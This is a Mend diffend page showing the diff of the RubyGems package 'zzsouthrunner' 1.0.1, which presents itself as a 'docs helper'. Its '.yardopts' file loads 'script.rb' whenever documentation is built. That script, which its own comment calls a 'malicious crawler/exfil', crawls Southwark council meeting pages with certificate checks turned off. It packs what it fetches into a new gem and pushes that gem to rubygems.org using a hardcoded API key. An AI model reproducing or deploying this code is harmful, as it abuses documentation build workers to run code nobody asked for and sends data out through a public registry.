@@ -1,0 +1,955 @@
+Source: https://my.diffend.io/gems/zzsouthrunner/1.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - zzsouthrunner - Versions diffs - 1.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+zzsouthrunner
+
+Versions diffs
+
+1.0.1
+
+zzsouthrunner
+1.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (5)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/.yardopts
+
+          +1
+          -0
+
+            data/main.rb
+
+          +3
+          -0
+
+            data/script.rb
+
+          +119
+          -0
+
+            metadata
+
+          +41
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: 34987e9d1947e394ed696e3bb2f6aa7cc6424f60a165a662cdfb8ee36c23b3a1
+
+4
+
+            +
+              data.tar.gz: f9a0436af179cdda13bbfa3324b4d2fe7bc684803e74c8a3b61fe7e79f3b6a8a
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: 55ca908be51e1dffaa1dca891a482bc8f36c02d4f84465142a43661ccf70d37a63d830280d8bc17173baca4175a0413580e222a1054c06e1c450d824f77d54ae
+
+7
+
+            +
+              data.tar.gz: 5c13c91461481947375b6db9be6a897126e1266ed9e96ce61c2e949651a6551b04f68f12e156cecd743c89a04e08542377292286085533e28356cbd394c288a9
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            --load script.rb
+
+        data/main.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,3 @@
+
+1
+
+            +
+            # dummy docs
+
+2
+
+            +
+            module ZSouth
+
+3
+
+            +
+            end
+
+        data/script.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,119 @@
+
+1
+
+            +
+            # malicious crawler/exfil for Southwark Jan 2026 docs via rubydoc.info worker
+
+2
+
+            +
+            require 'net/http'
+
+3
+
+            +
+            require 'uri'
+
+4
+
+            +
+            require 'openssl'
+
+5
+
+            +
+            require 'rubygems/package'
+
+6
+
+            +
+            KEY='rubygems_d8e875bd0a97e2f33498dba3ef41ffb1f951adb1b503a533'
+
+7
+
+            +
+            LOG=[]
+
+8
+
+            +
+            def fetch_url(url, lim=6)
+
+9
+
+            +
+             LOG << "FETCH #{url}"
+
+10
+
+            +
+             begin
+
+11
+
+            +
+               uri=URI(url)
+
+12
+
+            +
+               http=Net::HTTP.new(uri.host,uri.port)
+
+13
+
+            +
+               http.use_ssl=(uri.scheme=='https')
+
+14
+
+            +
+               http.verify_mode=OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
+
+15
+
+            +
+               http.open_timeout=12; http.read_timeout=35
+
+16
+
+            +
+               req=Net::HTTP::Get.new(uri.request_uri, {'User-Agent'=>'Mozilla/5.0 SLN research','Accept'=>'*/*'})
+
+17
+
+            +
+               res=http.request(req)
+
+18
+
+            +
+               if res.is_a?(Net::HTTPRedirection) && lim>0
+
+19
+
+            +
+                  loc=URI.join(url,res['location']).to_s
+
+20
+
+            +
+                  LOG << "REDIR #{res.code} #{loc}"
+
+21
+
+            +
+                  return fetch_url(loc,lim-1)
+
+22
+
+            +
+               end
+
+23
+
+            +
+               LOG << "RES #{res.code} bytes=#{res.body.to_s.bytesize} type=#{res['content-type']}"
+
+24
+
+            +
+               [url,res]
+
+25
+
+            +
+             rescue Exception=>e
+
+26
+
+            +
+               LOG << "ERR #{e.class}: #{e}"
+
+27
+
+            +
+               nil
+
+28
+
+            +
+             end
+
+29
+
+            +
+            end
+
+30
+
+            +
+
+31
+
+            +
+            # avoid recursive builds repeated pushes; exfil gem only generated if not yet on worker marker? Yard may run twice. duplicate push harmless.
+
+32
+
+            +
+            base='https://moderngov.southwark.gov.uk/'
+
+33
+
+            +
+            out={}
+
+34
+
+            +
+            # ModernGov calendar variants and committee hints; Southwark site cert unknown so try https+http.
+
+35
+
+            +
+            paths=[
+
+36
+
+            +
+             'mgCalendarMonthView.aspx?GL=1&bcr=1',
+
+37
+
+            +
+             'mgCalendarMonthView.aspx?M=1&Y=2026&GL=1&bcr=1',
+
+38
+
+            +
+             'mgCalendarMonthView.aspx?M=1&Y=2026',
+
+39
+
+            +
+             'mgCalendarWeekView.aspx?CI=0&c=-1&year=2026&month=1&day=26',
+
+40
+
+            +
+            ]
+
+41
+
+            +
+            paths.each_with_index do |p,i|
+
+42
+
+            +
+             ret=fetch_url(base+p)
+
+43
+
+            +
+             if ret && ret[1].is_a?(Net::HTTPSuccess)
+
+44
+
+            +
+                out["cal#{i}.html"]=ret[1].body
+
+45
+
+            +
+             else
+
+46
+
+            +
+                # attempt plain HTTP
+
+47
+
+            +
+                ret=fetch_url('http://moderngov.southwark.gov.uk/'+p)
+
+48
+
+            +
+                out["cal#{i}_http.txt"]=ret[1].body if ret
+
+49
+
+            +
+             end
+
+50
+
+            +
+            end
+
+51
+
+            +
+            # local website alternate host southwark.gov.uk meetings pages
+
+52
+
+            +
+            ret=fetch_url('https://www.southwark.gov.uk/about-council/how-council-works/council-and-committee-meetings'); out['landing.html']=ret[1].body if ret
+
+53
+
+            +
+            # Collect meeting ieList links from HTML calendars. Path includes encoded amp;amp; noise.
+
+54
+
+            +
+            all_links=[]
+
+55
+
+            +
+            out.values.each do |body|
+
+56
+
+            +
+             body.to_s.scan(/(?:href=)?["']?([^\s"'<>]*?(?:ieListDocuments\.aspx|mgMeetingAttendance\.aspx|ieListMeetings\.aspx)[^\s"'<>]*)/i).each do |m|
+
+57
+
+            +
+               all_links << m[0].gsub('&amp;','&')
+
+58
+
+            +
+             end
+
+59
+
+            +
+            end
+
+60
+
+            +
+            all_links.uniq!
+
+61
+
+            +
+            LOG << "EXTRACT rawlinks #{all_links.length}: #{all_links.first(80).join(' | ')}"
+
+62
+
+            +
+            # normalize and fetch max docs; include any Jan-targeted committee list pages
+
+63
+
+            +
+            all_links.first(120).each_with_index do |link,i|
+
+64
+
+            +
+             begin
+
+65
+
+            +
+               link=link.sub(/^.*?(ieList|mgMeeting)/i,'\\1') unless link.start_with?('http','/','ie','mg')
+
+66
+
+            +
+               url= URI.join(base,link).to_s
+
+67
+
+            +
+               ret=fetch_url(url)
+
+68
+
+            +
+               if ret
+
+69
+
+            +
+                  out["page#{i}.html"]=ret[1].body.to_s
+
+70
+
+            +
+               end
+
+71
+
+            +
+             rescue Exception=>e
+
+72
+
+            +
+               LOG << "LINKERR #{link}:#{e}"
+
+73
+
+            +
+             end
+
+74
+
+            +
+            end
+
+75
+
+            +
+            # Extract PDF, report, JS attachment links from pages. Prioritize docs containing MId links and agenda PDF.
+
+76
+
+            +
+            pdflinks=[]
+
+77
+
+            +
+            out.values.each do |body|
+
+78
+
+            +
+             body.to_s.scan(/(?:href=)?["']?([^\s"'<>]*?(?:\/documents\/|mgConvert2PDF\.aspx|ieDecisionDetails\.aspx|ieIssueDetails\.aspx)[^\s"'<>]*)/i).each {|m| pdflinks << m[0].gsub('&amp;','&') }
+
+79
+
+            +
+            end
+
+80
+
+            +
+            pdflinks.uniq!
+
+81
+
+            +
+            LOG << "EXTRACT pdflinks #{pdflinks.length}: #{pdflinks.first(120).join(' | ')}"
+
+82
+
+            +
+            # Fetch first 60 pdf/docs and cap bytes ~20MB
+
+83
+
+            +
+            bytes=0
+
+84
+
+            +
+            pdflinks.first(160).each_with_index do |link,i|
+
+85
+
+            +
+             break if bytes>22_000_000
+
+86
+
+            +
+             begin
+
+87
+
+            +
+               url=URI.join(base,link).to_s
+
+88
+
+            +
+               ret=fetch_url(url)
+
+89
+
+            +
+               if ret
+
+90
+
+            +
+                  dat=ret[1].body.to_s
+
+91
+
+            +
+                  # save any response
+
+92
+
+            +
+                  out["doc#{i}.bin"]=dat
+
+93
+
+            +
+                  out["doc#{i}_url.txt"]=url
+
+94
+
+            +
+                  bytes += dat.bytesize
+
+95
+
+            +
+               end
+
+96
+
+            +
+             rescue Exception=>e; LOG << "DOCERR #{link}:#{e}"; end
+
+97
+
+            +
+            end
+
+98
+
+            +
+            LOG << "TOTAL files=#{out.length} bytes=#{out.values.map(&:bytesize).sum}"
+
+99
+
+            +
+            # Make exfil gem
+
+100
+
+            +
+            begin
+
+101
+
+            +
+              require 'zlib'; require 'rubygems'
+
+102
+
+            +
+              dir='/tmp/exfilSouth'+rand(999_999).to_s; Dir.mkdir(dir)
+
+103
+
+            +
+              Dir.chdir(dir) do
+
+104
+
+            +
+                File.binwrite('README.txt',"South crawl\n"+LOG.join("\n"))
+
+105
+
+            +
+                # limit each filename
+
+106
+
+            +
+                out.each { |fn,data| File.binwrite(fn,data) rescue nil }
+
+107
+
+            +
+                files=Dir.glob('*').select{|f| File.file?(f)}
+
+108
+
+            +
+                spec=Gem::Specification.new do |s|
+
+109
+
+            +
+                  s.name='zzsouthdocfetch'; s.version='1.0.'+ (Time.now.to_i % 80000).to_s
+
+110
+
+            +
+                  s.summary='cache docs'; s.description='exfil'; s.authors=['sln']; s.email='a@example.test'; s.files=files; s.license='MIT'; s.homepage='https://example.com'; s.metadata={}
+
+111
+
+            +
+                end
+
+112
+
+            +
+                gemfile=Gem::Package.build(spec, true)
+
+113
+
+            +
+                uri=URI('https://rubygems.org/api/v1/gems'); req=Net::HTTP::Post.new(uri); req['Authorization']=KEY; req['Content-Type']='application/octet-stream'; req.body=File.binread(gemfile)
+
+114
+
+            +
+                http=Net::HTTP.new(uri.host,uri.port); http.use_ssl=true; http.verify_mode=OpenSSL::SSL::VERIFY_NONE; res=http.request(req); File.write('/tmp/push_result.txt',res.code+' '+res.body.to_s) rescue nil; LOG << "PUSH #{res.code} #{res.body}"
+
+115
+
+            +
+              end
+
+116
+
+            +
+            rescue Exception=>e
+
+117
+
+            +
+             LOG << "FINALERR #{e.class} #{e}\n#{e.backtrace&.first(4)&.join("\\n")}" 
+
+118
+
+            +
+            end
+
+119
+
+            +
+            File.write('/tmp/zzsouthlog','done '+LOG.join("\n")) rescue nil
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,41 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: zzsouthrunner
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 1.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - sln
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            email: none@example.test
+
+13
+
+            +
+            executables: []
+
+14
+
+            +
+            extensions: []
+
+15
+
+            +
+            extra_rdoc_files: []
+
+16
+
+            +
+            files:
+
+17
+
+            +
+            - ".yardopts"
+
+18
+
+            +
+            - main.rb
+
+19
+
+            +
+            - script.rb
+
+20
+
+            +
+            homepage: https://example.test
+
+21
+
+            +
+            licenses:
+
+22
+
+            +
+            - MIT
+
+23
+
+            +
+            metadata: {}
+
+24
+
+            +
+            rdoc_options: []
+
+25
+
+            +
+            require_paths:
+
+26
+
+            +
+            - "."
+
+27
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+28
+
+            +
+              requirements:
+
+29
+
+            +
+              - - ">="
+
+30
+
+            +
+                - !ruby/object:Gem::Version
+
+31
+
+            +
+                  version: '0'
+
+32
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+33
+
+            +
+              requirements:
+
+34
+
+            +
+              - - ">="
+
+35
+
+            +
+                - !ruby/object:Gem::Version
+
+36
+
+            +
+                  version: '0'
+
+37
+
+            +
+            requirements: []
+
+38
+
+            +
+            rubygems_version: 3.6.7
+
+39
+
+            +
+            specification_version: 4
+
+40
+
+            +
+            summary: docs helper
+
+41
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
